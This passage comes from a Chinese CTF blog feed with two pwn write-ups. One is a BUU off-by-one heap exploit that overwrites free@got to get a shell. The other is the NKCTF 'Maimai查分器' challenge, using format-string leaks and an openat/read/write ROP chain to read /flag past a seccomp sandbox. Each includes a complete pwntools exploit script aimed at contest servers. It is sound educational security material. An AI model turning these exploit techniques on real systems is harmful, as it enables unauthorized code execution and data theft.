<h3 id="覆盖-free-got-表"><a href="#覆盖-free-got-表" class="headerlink" title="覆盖_free@got_表"></a>覆盖_free@got_表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>​	同样，<em>edit</em>函数修改<em>chunk</em>内容，也是修改指针<em>chunk</em>的指针指向的区域。得到<em>system</em>的地址后，直接用<em>edit</em>函数修改<em>chunk1</em>的内容即可。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102208262.png" alt="image-20240710220849174"></p>
<p>最后直接<em>free</em>掉<em>chunk0</em>，便能执行<code>system(&quot;/bin/sh&quot;)</code>，得到<em>shell</em>。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28974</span>)</span><br><span class="line">debug(p,<span class="number">0x400DC4</span>,<span class="number">0x400DB8</span>,<span class="number">0x400DD0</span>,<span class="number">0x400DDC</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102221509.png" alt="image-20240710222113464"></p>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>BUU刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>off-by-one</tag>
      </tags>
  </entry>
  <entry>
    <title>NKCTF_Maimai查分器</title>
    <url>/2024/03/23/%E8%B5%9B%E9%A2%98wp/NKCTF-Maimai%E6%9F%A5%E5%88%86%E5%99%A8/</url>
    <content><![CDATA[<h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li><p>当栈溢出的字节数不能满足我们构造完整的<code>rop</code>链时，除了栈迁移我们还可以先构造一个<code>read</code>的<code>rop</code>链，让程序再<code>read</code>一次，然后再写入<code>rop</code>链覆盖我们调用<code>read</code>时自己写的返回地址，以控制执行流执行<code>rop</code>链。</p>
<span id="more"></span>
</li>
<li><p>有的程序开了沙箱会过滤一些函数，除了<code>system</code>其他函数如<code>open</code>也可能被过滤，可以使用命令<code>seccomp-tools dump ./pwn</code>查看。</p>
</li>
<li><p><code>openat</code>函数也是一个类似于<code>open</code>的打开文件的函数，<code>openat</code>函数有<code>4</code>个参数。<code>openat</code>函数的第一个参数如果是<code>0</code>，其第二个参数必须为文件的绝对路径；第二个参数如果是文件的相对路径，其第一个参数需为相对路径前的路径。</p>
</li>
<li><p>知道了<code>libc</code>基地址，我们需要任何没见过的函数都可以到<code>libc</code>中寻找，如果利用<code>ROPgadget --binary pwn | grep &quot;gadget&quot;</code>没找到<code>gadget</code>，我们也可以去<code>libc</code>中寻找。利用<code>ROPgadget --binary libc.so.6 | grep &quot;gadget&quot;</code>命令，我们找的是偏移<code>gadget_offset</code>，<code>gadget</code>的地址<code>gadget_addr = gadget_offset+libc_base</code>。</p>
</li>
<li><p>在泄漏<code>libc</code>基地址的时候，一般都是随便<code>printf</code>出一个<code>libc</code>中的任意地址，然后在<code>ida</code>中计算偏移。但是如果本地的偏移与远程不同，且我们不容易把本地换成远程的<code>libc</code>，我们可以<code>printf</code>出准确函数函数的<code>libc</code>地址，然后用<code>elf.sym[&#39;read&#39;]</code>这种表示出偏移。</p>
</li>
</ol>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102243265.png" alt="image-20240323232259681"></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244858.png" alt="image-20240323232554875"></p>
<h3 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h3><p>​	有一个格式化字符串漏洞只能输入<code>8</code>字节，和一个栈溢出漏洞。保护全开，我们先泄漏一个<code>canary</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>泄漏<code>libc</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%3$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;read&#x27;</span>]-<span class="number">18</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>泄漏一个栈地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>​	本题拿到<code>shell</code>后没有权限去<code>cat flag</code>，但是我们可以用<code>open-read-write</code>把<code>flag</code>读出并打印出来，又因为过滤了<code>open</code>，所以我们要用一个与<code>open</code>函数类似的<code>openat</code>函数打开文件。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244179.png" alt="image-20240324190744811" style="zoom:80%;" />

<h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置<code>rop</code>链</h3><p>​	因为是<code>64</code>位程序，所以传参需要寄存器，我们在程序里找不到<code>gadget</code>，但是我们可以到<code>libc</code>中找<code>gadget</code>的偏移，再加上<code>libc</code>基地址即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">rdx_r12 = <span class="number">0x000000000011f2e7</span>+libc_base<span class="comment">#0x000000000011f497+libc_base</span></span><br><span class="line">rcx = <span class="number">0x3d1ee</span>+libc_base<span class="comment">#0x000000000008c6bb+libc_base</span></span><br></pre></td></tr></table></figure>

<p>​	程序中我们能溢出<code>80</code>个字节，但是<code>orw_rop</code>链的长度远远超过了<code>0x80</code>个字节，因此我们可以先<code>read</code>一次，<code>read</code>到哪儿呢？<code>read</code>到装返回地址的这个地址里，覆盖我们的返回地址，这样才能继续控制执行流执行接下来的<code>orw_rop</code>链。这个返回地址，是我们在<code>r_rop</code>链中自己布置的，调用完<code>read</code>函数后的返回地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>) <span class="comment">#这个stack+0x38-8是我们后来填上的</span></span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>) <span class="comment">#返回地址随便填，会被orw_rop链覆盖</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#注意这里不能用sendline，因为我们布置的r_rop链已经刚好把0x80个字节占完，再发送一个回车(\n)便会被暂时放在缓冲区，然后被我们再次调用的read读入，而后面发送的orw_rop链也就不会被读入</span></span><br></pre></td></tr></table></figure>

<p>​	然后布置<code>orw_rop</code>链，由于文件描述符<code>0,1,2</code>已被占用，这里我们<code>openat</code>打开的新文件的文件描述符为<code>3</code>，所以<code>read</code>读取<code>flag</code>的第一个寄存器的值应该是<code>3</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)+p64(rdx_r12)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rcx)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;openat&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#read函数的第一个寄存器为要读取数据的文件的文件描述符，即3</span></span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]+libc_base)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node.nkctf.yuzhian.com.cn&quot;</span>,<span class="number">33656</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/wen/Desktop/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">al = p.recvuntil(<span class="string">b&#x27;Select a option:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    payload = <span class="built_in">str</span>(<span class="number">15.0</span>).encode()+<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    payload = <span class="built_in">str</span>(<span class="number">15.0</span>).encode()+<span class="string">b&#x27;SSS+&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%3$p&#x27;</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1a36</span>,<span class="number">0x19ce</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;read&#x27;</span>]-<span class="number">18</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">rdx_r12 = <span class="number">0x000000000011f2e7</span>+libc_base<span class="comment">#0x000000000011f497+libc_base</span></span><br><span class="line">rcx = <span class="number">0x3d1ee</span>+libc_base<span class="comment">#0x000000000008c6bb+libc_base</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">0x100000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)+p64(rdx_r12)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rcx)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;openat&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]+libc_base)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244004.png" alt="image-20240324192822020"></p>
]]></content>
      <categories>
        <category>赛题wp</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>沙箱</tag>
      </tags>
  </entry>
</search>
